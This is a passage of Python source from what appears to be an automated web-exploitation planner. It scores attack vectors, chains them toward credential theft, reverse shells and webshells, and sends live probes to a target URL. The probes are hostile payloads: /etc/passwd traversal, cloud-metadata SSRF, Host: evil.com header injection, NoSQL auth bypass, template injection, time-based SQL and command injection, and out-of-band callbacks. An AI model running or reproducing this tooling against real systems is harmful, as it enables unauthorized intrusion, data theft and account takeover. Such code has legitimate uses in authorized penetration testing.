        payloads = self.WAF_BYPASS.get(waf_type, self.WAF_BYPASS["generic"])
        
        for payload in payloads:
            if payload not in state.blocked_patterns:
                vector = AttackVector(
                    name=f"waf_bypass_{waf_type}",
                    type="waf_bypass",
                    target="",
                    payload=payload,
                    success_probability=WAF_BYPASS_PROBABILITY,  # M3 FIX: Use constant
                    impact_score=0.8,
                )
                vectors.append(vector)
        
        return vectors
    
    def _score_vectors(
        self,
        vectors: List[AttackVector],
        signals: List[Signal],
        state: NeuralState,
    ) -> List[AttackVector]:
        """Score vectors based on available signals and state."""
        for vector in vectors:
            # Boost probability if relevant signals are strong
            relevant_signals = [s for s in signals if self._signal_supports_vector(s, vector)]
            if relevant_signals:
                avg_strength = sum(s.strength for s in relevant_signals) / len(relevant_signals)
                vector.success_probability *= (1 + avg_strength)
            
            # Reduce if similar patterns were blocked
            for blocked in state.blocked_patterns:
                if self._similar_pattern(blocked, vector.payload):
                    vector.success_probability *= 0.5
            
            # Boost if similar patterns worked
            for working in state.working_patterns:
                if self._similar_pattern(working, vector.payload):
                    vector.success_probability *= 1.5
            
            # Cap at 1.0
            vector.success_probability = min(vector.success_probability, 1.0)
        
        return vectors
    
    def _signal_supports_vector(self, signal: Signal, vector: AttackVector) -> bool:
        """Check if a signal supports an attack vector."""
        mappings = {
            SignalType.XSS_POSSIBLE: ["xss", "reflection"],
            SignalType.SQLI_POSSIBLE: ["sqli", "injection", "blind_sqli"],
            SignalType.REFLECTION: ["xss", "reflection"],
            SignalType.TIMING_ANOMALY: ["blind", "sqli", "timing"],
            SignalType.SSTI_POSSIBLE: ["ssti", "template", "jinja"],
            SignalType.XXE_POSSIBLE: ["xxe", "xml"],
            SignalType.CMDI_POSSIBLE: ["cmdi", "command"],
            SignalType.CRLF_POSSIBLE: ["crlf", "header"],
            SignalType.NOSQL_POSSIBLE: ["nosql", "mongo"],
            SignalType.DESERIALIZATION_POSSIBLE: ["deserialization", "unserialize"],
            SignalType.JWT_WEAK: ["jwt", "token"],
            SignalType.CORS_MISCONFIGURED: ["cors"],
            SignalType.OPEN_REDIRECT_POSSIBLE: ["redirect"],
            SignalType.PATH_TRAVERSAL_POSSIBLE: ["path_traversal", "lfi", "traversal"],
            SignalType.LFI_POSSIBLE: ["lfi", "path_traversal", "file"],
            SignalType.SSRF_POSSIBLE: ["ssrf", "fetch"],
            SignalType.IDOR_POSSIBLE: ["idor", "access"],
            SignalType.WAF_BLOCK: ["waf", "bypass"],
            SignalType.OOB_SSRF: ["ssrf", "oob"],
            SignalType.OOB_XXE: ["xxe", "oob"],
            SignalType.OOB_RCE: ["rce", "cmdi", "oob"],
            SignalType.OOB_SQLI: ["sqli", "oob"],
            SignalType.OOB_SSTI: ["ssti", "oob"],
            SignalType.BLIND_TIMING: ["blind", "timing", "sqli"],
            SignalType.BLIND_BOOLEAN: ["blind", "boolean", "sqli"],
        }

        keywords = mappings.get(signal.type)
        if keywords:
            return any(kw in vector.type.lower() for kw in keywords)

        return False
    
    def _similar_pattern(self, pattern1: str, pattern2: str) -> bool:
        """Check if two patterns are similar."""
        # Simple similarity check
        p1 = set(pattern1.lower().split())
        p2 = set(pattern2.lower().split())
        
        if not p1 or not p2:
            return False
        
        overlap = len(p1 & p2) / max(len(p1), len(p2))
        return overlap > 0.5
    
    def _get_impact_score(self, strategy: str) -> float:
        """Get impact score for a strategy."""
        impact_map = {
            # Injection — RCE-capable
            "sqli_exploitation": 1.0,
            "blind_sqli": 1.0,
            "ssti_exploitation": 1.0,
            "jinja2_ssti": 1.0,
            "java_ssti": 1.0,
            "cmdi_exploitation": 1.0,
            "php_cmdi": 1.0,
            "xxe_exploitation": 0.9,
            "nosql_exploitation": 0.9,
            "sqli_plus_file_write": 1.0,
            # XSS family
            "xss_exploitation": 0.8,
            "xss_probing": 0.6,
            "php_xss": 0.8,
            "node_xss": 0.8,
            "java_xss": 0.8,
            # Access control
            "idor_exploitation": 0.9,
            "jwt_exploitation": 0.9,
            "cors_exploitation": 0.7,
            "deserialization_exploitation": 1.0,
            # Network / SSRF
            "ssrf_exploitation": 1.0,
            "node_ssrf": 1.0,
            # File access
            "path_traversal_exploitation": 0.9,
            "php_lfi": 0.9,
            "php_lfi_rce": 1.0,
            # Header / redirect
            "crlf_exploitation": 0.7,
            "redirect_exploitation": 0.6,
            # WAF bypass (amplifier, not standalone)
            "waf_bypass": 0.7,
            "waf_bypass_sqli": 0.9,
            "waf_bypass_xss": 0.8,
        }
        return impact_map.get(strategy, 0.5)


# =============================================================================
# COMPOUND ATTACK SYNTHESIZER
# =============================================================================

class CompoundAttackSynthesizer:
    """Synthesizes compound attacks from multiple vectors."""
    
    # Compound attack templates
    COMPOUND_TEMPLATES = {
        "xss_to_session_hijack": {
            "name": "XSS to Session Hijacking",
            "steps": ["reflection_test", "xss_injection", "cookie_theft"],
            "required_signals": [SignalType.XSS_POSSIBLE],
            "impact": 1.0,
        },
        "sqli_to_data_dump": {
            "name": "SQLi to Data Extraction",
            "steps": ["error_detection", "sqli_injection", "union_extraction"],
            "required_signals": [SignalType.SQLI_POSSIBLE],
            "impact": 1.0,
        },
        "idor_to_account_takeover": {
            "name": "IDOR to Account Takeover",
            "steps": ["id_enumeration", "idor_access", "profile_modification"],
            "required_signals": [SignalType.IDOR_POSSIBLE],
            "impact": 1.0,
        },
        "info_disclosure_to_exploitation": {
            "name": "Info Disclosure Chain",
            "steps": ["error_harvest", "endpoint_discovery", "targeted_attack"],
            "required_signals": [SignalType.ERROR_DISCLOSURE],
            "impact": 0.9,
        },
        "waf_bypass_to_xss": {
            "name": "WAF Bypass to XSS",
            "steps": ["waf_fingerprint", "bypass_technique", "xss_injection"],
            "required_signals": [SignalType.WAF_BLOCK, SignalType.REFLECTION],
            "impact": 0.9,
        },
        "blind_sqli_extraction": {
            "name": "Blind SQLi Data Extraction",
            "steps": ["timing_detection", "boolean_injection", "bit_extraction"],
            "required_signals": [SignalType.TIMING_ANOMALY],
            "impact": 1.0,
        },

        # FIX 2026-02-19: Added chains for new vulnerability types

        # SSTI chains
        "ssti_to_rce": {
            "name": "SSTI to Remote Code Execution",
            "steps": ["ssti_detection", "sandbox_escape", "rce_execution"],
            "required_signals": [SignalType.SSTI_POSSIBLE],
            "impact": 1.0,
        },

        # XXE chains
        "xxe_to_ssrf": {
            "name": "XXE to SSRF Chain",
            "steps": ["xxe_detection", "external_entity", "internal_scan"],
            "required_signals": [SignalType.XXE_POSSIBLE],
            "impact": 1.0,
        },
        "xxe_to_file_read": {
            "name": "XXE to File Read",
            "steps": ["xxe_detection", "file_entity", "data_extraction"],
            "required_signals": [SignalType.XXE_POSSIBLE],
            "impact": 0.9,
        },

        # SSRF chains
        "ssrf_to_cloud_metadata": {
            "name": "SSRF to Cloud Credential Theft",
            "steps": ["ssrf_detection", "metadata_access", "credential_extraction"],
            "required_signals": [SignalType.SSRF_POSSIBLE],
            "impact": 1.0,
        },
        "ssrf_to_internal_scan": {
            "name": "SSRF to Internal Network Discovery",
            "steps": ["ssrf_detection", "port_scan", "service_enumeration"],
            "required_signals": [SignalType.SSRF_POSSIBLE],
            "impact": 0.9,
        },

        # LFI chains
        "lfi_to_rce": {
            "name": "LFI to Remote Code Execution",
            "steps": ["lfi_detection", "log_poisoning", "code_execution"],
            "required_signals": [SignalType.LFI_POSSIBLE],
            "impact": 1.0,
        },
        "lfi_to_source_disclosure": {
            "name": "LFI to Source Code Disclosure",
            "steps": ["lfi_detection", "php_wrapper", "source_extraction"],
            "required_signals": [SignalType.LFI_POSSIBLE, SignalType.TECH_PHP],
            "impact": 0.9,
        },

        # Command Injection chains
        "cmdi_to_shell": {
            "name": "Command Injection to Reverse Shell",
            "steps": ["cmdi_detection", "payload_bypass", "shell_establishment"],
            "required_signals": [SignalType.CMDI_POSSIBLE],
            "impact": 1.0,
        },

        # NoSQL chains
        "nosql_to_auth_bypass": {
            "name": "NoSQL Injection to Auth Bypass",
            "steps": ["nosql_detection", "operator_injection", "authentication_bypass"],
            "required_signals": [SignalType.NOSQL_POSSIBLE],
            "impact": 1.0,
        },

        # JWT chains
        "jwt_to_privilege_escalation": {
            "name": "JWT Weakness to Privilege Escalation",
            "steps": ["jwt_analysis", "signature_bypass", "role_escalation"],
            "required_signals": [SignalType.JWT_WEAK],
            "impact": 1.0,
        },

        # Multi-vuln chains
        "xss_plus_csrf": {
            "name": "XSS + CSRF to Account Takeover",
            "steps": ["xss_injection", "csrf_token_theft", "password_change"],
            "required_signals": [SignalType.XSS_POSSIBLE],
            "impact": 1.0,
        },
        "sqli_plus_file_write": {
            "name": "SQLi to File Write RCE",
            "steps": ["sqli_detection", "into_outfile", "webshell_access"],
            "required_signals": [SignalType.SQLI_POSSIBLE],
            "impact": 1.0,
        },

        # WAF bypass chains
        "waf_bypass_to_sqli": {
            "name": "WAF Bypass to SQLi",
            "steps": ["waf_fingerprint", "encoding_bypass", "sqli_exploitation"],
            "required_signals": [SignalType.WAF_BLOCK, SignalType.SQLI_POSSIBLE],
            "impact": 1.0,
        },
        "waf_bypass_to_rce": {
            "name": "WAF Bypass to RCE",
            "steps": ["waf_fingerprint", "obfuscation", "command_injection"],
            "required_signals": [SignalType.WAF_BLOCK, SignalType.CMDI_POSSIBLE],
            "impact": 1.0,
        },
    }
    
    def synthesize_chains(
        self,
        vectors: List[AttackVector],
        signals: List[Signal],
        state: NeuralState,
    ) -> List[ExploitChain]:
        """Synthesize compound attack chains."""
        chains = []
        signal_types = set(s.type for s in signals)
        
        for template_id, template in self.COMPOUND_TEMPLATES.items():
            # Check if required signals are present
            if all(sig in signal_types for sig in template["required_signals"]):
                # Find matching vectors for each step
                chain_vectors = self._find_chain_vectors(template, vectors)
                
                if chain_vectors:
                    chain = ExploitChain(
                        name=template["name"],
                        steps=chain_vectors,
                        combined_probability=self._calculate_chain_prob(chain_vectors),
                        combined_impact=template["impact"],
                    )
                    chains.append(chain)
        
        return chains
    
    def _find_chain_vectors(
        self,
        template: Dict,
        vectors: List[AttackVector],
    ) -> List[AttackVector]:
        """Find vectors matching chain steps.

        Returns the matched list only when ALL steps have a matching vector.
        An empty list signals that this chain template cannot be satisfied.
        """
        matched = []

        for step in template["steps"]:
            found = False
            for vector in vectors:
                if step in vector.type or step in vector.name:
                    matched.append(vector)
                    found = True
                    break
            if not found:
                return []  # Incomplete chain — reject entirely

        return matched
    
    def _calculate_chain_prob(self, vectors: List[AttackVector]) -> float:
        """Calculate combined probability for a chain."""
        if not vectors:
            return 0.0
        
        prob = 1.0
        for v in vectors:
            prob *= v.success_probability
        
        return prob


# =============================================================================
# NEURAL ATTACK PLANNER (MAIN CLASS)
# =============================================================================

class NeuralAttackPlanner:
    """
    The main neural attack planning system.

    Coordinates all components to make intelligent attack decisions.
    """

    def __init__(self, http_client=None, rate_limiter=None, oob_engine=None):
        self.http_client = http_client
        self.rate_limiter = rate_limiter

        # Components
        self.signal_detector = SignalDetector()
        self.decision_engine = NeuralDecisionEngine()
        self.synthesizer = CompoundAttackSynthesizer()

        # FIX 2026-02-19: OOB/Blind detection integration
        self.oob_engine = oob_engine
        self._oob_tokens: Dict[str, Any] = {}  # token -> OOBToken mapping
        self._pending_oob_checks: List[str] = []  # tokens to check for callbacks

        # State - H5 FIX 2026-02-13: Use bounded lists
        self.state = NeuralState()
        self.state.signals = BoundedList(MAX_SIGNALS)
        self.state.vectors = BoundedList(MAX_VECTORS)
        self.exploits: List[Dict] = BoundedList(MAX_EXPLOITS)

        # H3 FIX 2026-02-13: Thread safety
        self._lock = asyncio.Lock()

        # H2 FIX 2026-02-13: Metrics tracking
        self._init_metrics()

    def _init_metrics(self) -> None:
        """Initialize metrics tracking."""
        self._metrics = {
            "signals_detected": 0,
            "vectors_generated": 0,
            "vectors_executed": 0,
            "successful_attacks": 0,
            "escalations_attempted": 0,
            "escalations_successful": 0,
            "chains_synthesized": 0,
            "by_signal_type": defaultdict(int),
            "by_attack_type": defaultdict(int),
        }

    def get_metrics(self) -> dict:
        """Get current metrics."""
        metrics = dict(self._metrics)
        metrics["by_signal_type"] = dict(metrics["by_signal_type"])
        metrics["by_attack_type"] = dict(metrics["by_attack_type"])
        return metrics

    def reset_metrics(self) -> None:
        """Reset all metrics to initial state."""
        self._init_metrics()

    async def analyze(
        self,
        target_url: str,
        findings: List[dict] = None,
        max_iterations: int = 20,
    ) -> List[Dict]:
        """Convenience entry point used by the scanning pipeline.

        Returns only the list of successful exploits (findings) so that the
        caller can feed them directly into ``context.add_findings()``.
        """
        exploits, _chains, _report = await self.plan_and_execute(
            target_url, findings, max_iterations,
        )
        return exploits

    async def plan_and_execute(
        self,
        target_url: str,
        initial_findings: List[dict] = None,
        max_iterations: int = 20,
    ) -> Tuple[List[Dict], List[ExploitChain], str]:
        """
        Main entry point for neural attack planning.

        Returns:
            Tuple of (exploits found, chains created, report)
        """
        # H4 FIX 2026-02-13: Input validation
        if not target_url:
            raise ValueError("target_url is required")
        if not target_url.startswith(("http://", "https://")):
            raise ValueError("target_url must be a valid HTTP(S) URL")
        if max_iterations < 1:
            raise ValueError("max_iterations must be >= 1")
        if max_iterations > MAX_ITERATIONS_LIMIT:
            raise ValueError(f"max_iterations must be <= {MAX_ITERATIONS_LIMIT}")

        initial_findings = initial_findings or []

        logger.info(f"[Neural] Starting neural attack planning: {target_url}")
        
        # =================================================================
        # PHASE 1: BASELINE & INITIAL SIGNALS
        # =================================================================
        
        await self._establish_baseline(target_url)
        
        # Process initial findings into signals
        initial_signals = self._findings_to_signals(initial_findings)
        self.state.signals.extend(initial_signals)
        
        logger.info(f"[Neural] Initial signals: {len(initial_signals)}")
        
        # =================================================================
        # PHASE 2: RECONNAISSANCE
        # =================================================================
        
        self.state.phase = PlannerPhase.RECONNAISSANCE
        recon_signals = await self._reconnaissance(target_url)
        self.state.signals.extend(recon_signals)
        
        logger.info(f"[Neural] Recon signals: {len(recon_signals)}")
        
        # =================================================================
        # PHASE 3: NEURAL PLANNING
        # =================================================================
        
        self.state.phase = PlannerPhase.VULNERABILITY_ANALYSIS
        
        # Get attack vectors from decision engine
        vectors = self.decision_engine.analyze_signals(
            self.state.signals,
            self.state,
        )
        self.state.vectors.clear()
        self.state.vectors.extend(vectors)

        self._metrics["vectors_generated"] = len(self.state.vectors)
        logger.info(f"[Neural] Attack vectors generated: {len(self.state.vectors)}")

        # Synthesize compound attacks
        chains = self.synthesizer.synthesize_chains(
            vectors,
            self.state.signals,
            self.state,
        )

        self._metrics["chains_synthesized"] = len(chains)
        logger.info(f"[Neural] Compound chains: {len(chains)}")
        
        # =================================================================
        # PHASE 4: EXPLOITATION
        # =================================================================
        
        self.state.phase = PlannerPhase.EXPLOITATION
        
        for iteration in range(max_iterations):
            # Get best vector
            best = self._get_best_vector()
            if not best:
                break
            
            logger.info(f"[Neural] Iteration {iteration + 1}: Trying {best.name} (prob: {best.success_probability:.2f})")
            
            # Execute vector
            result = await self._execute_vector(target_url, best)
            
            # Learn from result
            self._learn_from_result(best, result)
            
            # If successful, try to escalate
            if result.get("success"):
                self._metrics["escalations_attempted"] += 1
                escalation = await self._try_escalation(target_url, best)
                if escalation:
                    self._metrics["escalations_successful"] += 1
                    self.exploits.append(escalation)
        
        # =================================================================
        # PHASE 5: REPORT GENERATION
        # =================================================================
        
        report = self._generate_report(target_url, chains)
        
        return self.exploits, chains, report
    
    # =========================================================================
    # PHASE IMPLEMENTATIONS
    # =========================================================================
    
    async def _establish_baseline(self, url: str):
        """Establish baseline for the target."""
        if not self.http_client:
            return
        
        try:
            if self.rate_limiter:
                await self.rate_limiter.acquire()
            
            start = datetime.now()
            response = await self.http_client.get(url)
            elapsed = (datetime.now() - start).total_seconds()
            
            self.state.baseline_length = len(response.text)
            self.state.baseline_time = elapsed
            self.state.baseline_status = response.status_code
            
            # Detect initial signals from baseline
            signals = self.signal_detector.detect_signals(
                response.text,
                dict(response.headers),
                response.status_code,
                elapsed,
            )
            self.state.signals.extend(signals)
            
        except Exception as e:
            logger.error(f"[Neural] Baseline error: {e}")
    
    async def _reconnaissance(self, url: str) -> List[Signal]:
        """Perform reconnaissance to gather signals."""
        signals = []

        if not self.http_client:
            return signals

        # =================================================================
        # GET-based probes
        # =================================================================
        get_probes = [
            # Reflection probe
            ("?test=NEURAL_PROBE_XSS", "NEURAL_PROBE_XSS"),
            # Error probe
            ("?id='", None),
            # Path probe
            ("/../../../../etc/passwd", None),
            # SSRF probe
            ("?url=http://169.254.169.254/", None),
        ]

        for probe, canary in get_probes:
            try:
                if self.rate_limiter:
                    await self.rate_limiter.acquire()

                test_url = urljoin(url, probe) if probe.startswith("/") else url + probe

                start = datetime.now()
                response = await self.http_client.get(test_url)
                elapsed = (datetime.now() - start).total_seconds()

                probe_signals = self.signal_detector.detect_signals(
                    response.text,
                    dict(response.headers),
                    response.status_code,
                    elapsed,
                    canary=canary,
                    baseline=self.state,
                )
                signals.extend(probe_signals)

            except Exception as e:
                logger.debug(f"[Neural] GET probe error: {e}")

        # =================================================================
        # POST form probes (FIX 2026-02-19)
        # =================================================================
        form_probes = [
            # Reflection probe
            ({"test": "NEURAL_PROBE_XSS"}, "NEURAL_PROBE_XSS"),
            # SQLi probe
            ({"id": "1'", "username": "admin'--"}, None),
            # NoSQL probe
            ({"username[$ne]": "", "password[$ne]": ""}, None),
        ]

        for form_data, canary in form_probes:
            try:
                if self.rate_limiter:
                    await self.rate_limiter.acquire()

                start = datetime.now()
                response = await self.http_client.post(
                    url,
                    data=form_data,
                    headers={"Content-Type": "application/x-www-form-urlencoded"},
                )
                elapsed = (datetime.now() - start).total_seconds()

                probe_signals = self.signal_detector.detect_signals(
                    response.text,
                    dict(response.headers),
                    response.status_code,
                    elapsed,
                    canary=canary,
                    baseline=self.state,
                )

                # Mark signals as POST-specific
                for sig in probe_signals:
                    sig.evidence["method"] = "POST"
                    sig.evidence["body_type"] = "form"
                signals.extend(probe_signals)

            except Exception as e:
                logger.debug(f"[Neural] POST form probe error: {e}")

        # =================================================================
        # JSON API probes (FIX 2026-02-19)
        # =================================================================
        json_probes = [
            # Reflection probe
            ({"test": "NEURAL_PROBE_JSON"}, "NEURAL_PROBE_JSON"),
            # SQLi probe
            ({"id": "1'", "query": "admin'--"}, None),
            # NoSQL probe
            ({"username": {"$ne": ""}, "password": {"$ne": ""}}, None),
            # SSTI probe
            ({"template": "{{7*7}}", "name": "${7*7}"}, "49"),
        ]

        for json_data, canary in json_probes:
            try:
                if self.rate_limiter:
                    await self.rate_limiter.acquire()

                start = datetime.now()
                response = await self.http_client.post(
                    url,
                    json=json_data,
                    headers={"Content-Type": "application/json"},
                )
                elapsed = (datetime.now() - start).total_seconds()

                probe_signals = self.signal_detector.detect_signals(
                    response.text,
                    dict(response.headers),
                    response.status_code,
                    elapsed,
                    canary=canary,
                    baseline=self.state,
                )

                # Mark signals as JSON API
                for sig in probe_signals:
                    sig.evidence["method"] = "POST"
                    sig.evidence["body_type"] = "json"
                signals.extend(probe_signals)

            except Exception as e:
                logger.debug(f"[Neural] JSON API probe error: {e}")

        # =================================================================
        # Header injection probes (FIX 2026-02-19)
        # =================================================================
        header_probes = [
            # Host header injection
            {"Host": "evil.com"},
            # SSRF via X-Forwarded-For
            {"X-Forwarded-For": "127.0.0.1"},
            {"X-Forwarded-Host": "evil.com"},
            # Cache poisoning
            {"X-Original-URL": "/admin"},
            {"X-Rewrite-URL": "/admin"},
        ]

        for headers in header_probes:
            try:
                if self.rate_limiter:
                    await self.rate_limiter.acquire()

                start = datetime.now()
                response = await self.http_client.get(url, headers=headers)
                elapsed = (datetime.now() - start).total_seconds()

                probe_signals = self.signal_detector.detect_signals(
                    response.text,
                    dict(response.headers),
                    response.status_code,
                    elapsed,
                    baseline=self.state,
                )

                # Check for header injection indicators
                for header_name, header_value in headers.items():
                    if header_value in response.text:
                        signals.append(Signal(
                            type=SignalType.REFLECTION,
                            strength=0.7,
                            source=f"Header injection: {header_name}",
                            evidence={"header": header_name, "value": header_value, "method": "header_injection"},
                        ))

                # Mark signals as header-based
                for sig in probe_signals:
                    sig.evidence["method"] = "header_injection"
                signals.extend(probe_signals)

            except Exception as e:
                logger.debug(f"[Neural] Header probe error: {e}")

        # =================================================================
        # OOB/Blind probes (FIX 2026-02-19)
        # =================================================================
        if self.oob_engine:
            oob_signals = await self._oob_reconnaissance(url)
            signals.extend(oob_signals)

        # =================================================================
        # Timing-based blind probes (FIX 2026-02-19)
        # =================================================================
        timing_signals = await self._timing_reconnaissance(url)
        signals.extend(timing_signals)

        return signals

    async def _oob_reconnaissance(self, url: str) -> List[Signal]:
        """Perform OOB-based reconnaissance for blind vulnerabilities."""
        signals = []

        if not self.oob_engine or not self.http_client:
            return signals

        try:
            # Import OOB types
            from utils.oob_engine import OOBPayloadGenerator

            # Check if oob_engine has payload generator
            if hasattr(self.oob_engine, 'payload_generator'):
                generator = self.oob_engine.payload_generator
            else:
                generator = OOBPayloadGenerator()

            # Generate tokens for each blind vuln type
            oob_probes = [
                ("ssrf", ["?url=", "?redirect=", "?callback="]),
                ("xxe", []),  # XXE needs POST with XML body
                ("rce", ["?cmd=", "?exec=", "?command="]),
            ]

            for vuln_type, param_suffixes in oob_probes:
                token = generator.generate_token()
                self._oob_tokens[token] = {
                    "type": vuln_type,
                    "url": url,
                    "created": datetime.now(),
                }

                payloads = generator.generate_all_payloads(vuln_type, token)

                for payload_info in payloads[:3]:  # Limit to 3 payloads per type
                    payload = payload_info.get("payload", "")
                    if not payload:
                        continue

                    # For SSRF - inject via GET params
                    if vuln_type == "ssrf":
                        for suffix in param_suffixes:
                            try:
                                if self.rate_limiter:
                                    await self.rate_limiter.acquire()

                                test_url = f"{url}{suffix}{quote(payload)}"
                                await self.http_client.get(test_url)
                                self._pending_oob_checks.append(token)

                            except Exception as e:
                                logger.debug(f"[Neural] OOB SSRF probe error: {e}")

                    # For XXE - inject via POST with XML body
                    elif vuln_type == "xxe":
                        try:
                            if self.rate_limiter:
                                await self.rate_limiter.acquire()

                            await self.http_client.post(
                                url,
                                content=payload,
                                headers={"Content-Type": "application/xml"},
                            )
                            self._pending_oob_checks.append(token)

                        except Exception as e:
                            logger.debug(f"[Neural] OOB XXE probe error: {e}")

                    # For RCE - inject via GET params
                    elif vuln_type == "rce":
                        for suffix in param_suffixes:
                            try:
                                if self.rate_limiter:
                                    await self.rate_limiter.acquire()

                                test_url = f"{url}{suffix}{quote(payload)}"
                                await self.http_client.get(test_url)
                                self._pending_oob_checks.append(token)

                            except Exception as e:
                                logger.debug(f"[Neural] OOB RCE probe error: {e}")

            # Wait briefly for callbacks then check
            await asyncio.sleep(2.0)
            oob_signals = await self._check_oob_callbacks()
            signals.extend(oob_signals)

        except ImportError:
            logger.debug("[Neural] OOB engine not available")
        except Exception as e:
            logger.debug(f"[Neural] OOB recon error: {e}")

        return signals

    async def _check_oob_callbacks(self) -> List[Signal]:
        """Check for OOB callbacks and convert to signals."""
        signals = []

        if not self.oob_engine:
            return signals

        try:
            for token in self._pending_oob_checks:
                token_info = self._oob_tokens.get(token)
                if not token_info:
                    continue

                # Check if callback was received (implementation depends on oob_engine)
                has_callback = False
                callback_data = {}

                if hasattr(self.oob_engine, 'check_callback'):
                    result = self.oob_engine.check_callback(token)
                    has_callback = result.get("has_callback", False)
                    callback_data = result.get("data", {})
                elif hasattr(self.oob_engine, 'store') and hasattr(self.oob_engine.store, 'tokens'):
                    oob_token = self.oob_engine.store.tokens.get(token)
                    if oob_token and oob_token.has_callback:
                        has_callback = True
                        callback_data = {"callbacks": oob_token.callbacks_received}

                if has_callback:
                    vuln_type = token_info.get("type", "unknown")
                    signal_type_map = {
                        "ssrf": SignalType.OOB_SSRF,
                        "xxe": SignalType.OOB_XXE,
                        "rce": SignalType.OOB_RCE,
                        "sqli": SignalType.OOB_SQLI,
                        "ssti": SignalType.OOB_SSTI,
                    }

                    signal_type = signal_type_map.get(vuln_type, SignalType.OOB_SSRF)

                    signals.append(Signal(
                        type=signal_type,
                        strength=0.95,  # OOB confirmation is high confidence
                        source=f"OOB callback received ({vuln_type})",
                        evidence={
                            "token": token,
                            "vuln_type": vuln_type,
                            "url": token_info.get("url"),
                            "callback_data": callback_data,
                        },
                    ))

                    logger.info(f"[Neural] OOB {vuln_type.upper()} confirmed via callback!")

            # Clear pending checks
            self._pending_oob_checks.clear()

        except Exception as e:
            logger.debug(f"[Neural] OOB callback check error: {e}")

        return signals

    async def _timing_reconnaissance(self, url: str) -> List[Signal]:
        """Perform timing-based blind detection."""
        signals = []

        if not self.http_client:
            return signals

        # Timing payloads for different injection types
        timing_probes = [
            # Blind SQLi - MySQL
            ("?id=1' AND SLEEP(3)--", 3.0, "sqli_mysql"),
            ("?id=1' AND SLEEP(3)#", 3.0, "sqli_mysql"),
            # Blind SQLi - PostgreSQL
            ("?id=1'; SELECT pg_sleep(3)--", 3.0, "sqli_postgres"),
            # Blind SQLi - MSSQL
            ("?id=1'; WAITFOR DELAY '0:0:3'--", 3.0, "sqli_mssql"),
            # Blind command injection
            ("?cmd=;sleep 3", 3.0, "cmdi"),
            ("?cmd=|sleep 3", 3.0, "cmdi"),
            # Blind SSTI (Python)
            ("?template={{range(10000000)|join}}", 2.0, "ssti_dos"),
        ]

        for probe, expected_delay, probe_type in timing_probes:
            try:
                if self.rate_limiter:
                    await self.rate_limiter.acquire()

                test_url = url + probe
                start = datetime.now()
                await self.http_client.get(test_url)
                elapsed = (datetime.now() - start).total_seconds()

                # Check if response was delayed
                if elapsed >= expected_delay * 0.8:  # 80% threshold
                    signal_type = SignalType.BLIND_TIMING
                    if "sqli" in probe_type:
                        signal_type = SignalType.SQLI_POSSIBLE
                    elif "cmdi" in probe_type:
                        signal_type = SignalType.CMDI_POSSIBLE
                    elif "ssti" in probe_type:
                        signal_type = SignalType.SSTI_POSSIBLE

                    signals.append(Signal(
                        type=signal_type,
                        strength=0.85,
                        source=f"Timing-based blind detection ({probe_type})",
                        evidence={
                            "probe": probe,
                            "expected_delay": expected_delay,
                            "actual_delay": elapsed,
                            "probe_type": probe_type,
                            "detection_method": "timing",
                        },
                    ))

                    logger.info(f"[Neural] Blind {probe_type} detected via timing ({elapsed:.2f}s)")

            except asyncio.TimeoutError:
                # Timeout can indicate successful delay
                signals.append(Signal(
                    type=SignalType.BLIND_TIMING,
                    strength=0.7,
                    source=f"Timeout-based detection ({probe_type})",
                    evidence={"probe": probe, "probe_type": probe_type, "timeout": True},
                ))
            except Exception as e:
                logger.debug(f"[Neural] Timing probe error: {e}")

        return signals
    
    def _findings_to_signals(self, findings: List[dict]) -> List[Signal]:
        """Convert initial findings to signals."""
        signals = []

        # Keyword → (SignalType, strength) mapping.  Checked against both
        # finding "type" and "name" fields (lowercased).
        _KEYWORD_MAP: List[Tuple[str, SignalType, float]] = [
            # Injection / XSS
            ("xss", SignalType.XSS_POSSIBLE, 0.7),
            ("reflection", SignalType.REFLECTION, 0.7),
            ("sqli", SignalType.SQLI_POSSIBLE, 0.7),
            ("sql_injection", SignalType.SQLI_POSSIBLE, 0.7),
            ("sql injection", SignalType.SQLI_POSSIBLE, 0.7),
            # Template / command injection
            ("ssti", SignalType.SSTI_POSSIBLE, 0.7),
            ("template_injection", SignalType.SSTI_POSSIBLE, 0.7),
            ("command_injection", SignalType.CMDI_POSSIBLE, 0.7),
            ("cmdi", SignalType.CMDI_POSSIBLE, 0.7),
            ("os_command", SignalType.CMDI_POSSIBLE, 0.7),
            # XXE / deserialization
            ("xxe", SignalType.XXE_POSSIBLE, 0.7),
            ("xml_external", SignalType.XXE_POSSIBLE, 0.7),
            ("deserialization", SignalType.DESERIALIZATION_POSSIBLE, 0.7),
            # NoSQL
            ("nosql", SignalType.NOSQL_POSSIBLE, 0.7),
            # Access control
            ("idor", SignalType.IDOR_POSSIBLE, 0.7),
            ("insecure_direct", SignalType.IDOR_POSSIBLE, 0.7),
            # SSRF / LFI / path traversal
            ("ssrf", SignalType.SSRF_POSSIBLE, 0.7),
            ("server_side_request", SignalType.SSRF_POSSIBLE, 0.7),
            ("lfi", SignalType.LFI_POSSIBLE, 0.7),
            ("local_file", SignalType.LFI_POSSIBLE, 0.7),
            ("path_traversal", SignalType.PATH_TRAVERSAL_POSSIBLE, 0.7),
            ("directory_traversal", SignalType.PATH_TRAVERSAL_POSSIBLE, 0.7),
            # Header / redirect
            ("crlf", SignalType.CRLF_POSSIBLE, 0.7),
            ("header_injection", SignalType.CRLF_POSSIBLE, 0.7),
            ("open_redirect", SignalType.OPEN_REDIRECT_POSSIBLE, 0.7),
            # Auth / JWT / CORS
            ("jwt", SignalType.JWT_WEAK, 0.7),
            ("cors", SignalType.CORS_MISCONFIGURED, 0.7),
            # Info disclosure
            ("error", SignalType.ERROR_DISCLOSURE, 0.6),
            ("disclosure", SignalType.ERROR_DISCLOSURE, 0.6),
        ]

        for finding in findings:
            ftype = finding.get("type", "").lower()
            fname = finding.get("name", "").lower()
            combined = f"{ftype} {fname}"

            matched_types: Set[SignalType] = set()
            for keyword, signal_type, strength in _KEYWORD_MAP:
                if keyword in combined and signal_type not in matched_types:
                    matched_types.add(signal_type)
                    signals.append(Signal(
                        type=signal_type,
                        strength=strength,
                        source=f"Finding: {fname}",
                        evidence=finding,
                    ))

            # Technology detection from findings
            if any(t in fname for t in ["php", "laravel", "wordpress"]):
                signals.append(Signal(type=SignalType.TECH_PHP, strength=0.8, source=fname))
            elif any(t in fname for t in ["node", "express", "react"]):
                signals.append(Signal(type=SignalType.TECH_NODEJS, strength=0.8, source=fname))
            elif any(t in fname for t in ["asp", ".net", "iis"]):
                signals.append(Signal(type=SignalType.TECH_DOTNET, strength=0.8, source=fname))
            elif any(t in fname for t in ["django", "flask", "python", "jinja"]):
